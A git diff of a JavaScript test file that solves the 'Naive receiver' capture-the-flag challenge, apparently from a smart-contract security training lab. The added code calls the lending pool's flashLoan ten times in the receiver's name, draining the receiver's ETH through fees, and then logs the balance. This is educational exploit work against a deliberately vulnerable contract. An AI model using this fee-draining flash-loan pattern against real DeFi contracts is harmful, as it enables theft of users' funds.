@@ -30,12 +30,15 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        for(let i=0; i<10;i++)
+        this.pool.flashLoan(await this.receiver.address, 0)
+        console.log(await (await ethers.provider.getBalance(this.receiver.address)).toString());
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
         // All ETH has been drained from the receiver
         expect(
             await ethers.provider.getBalance(this.receiver.address)
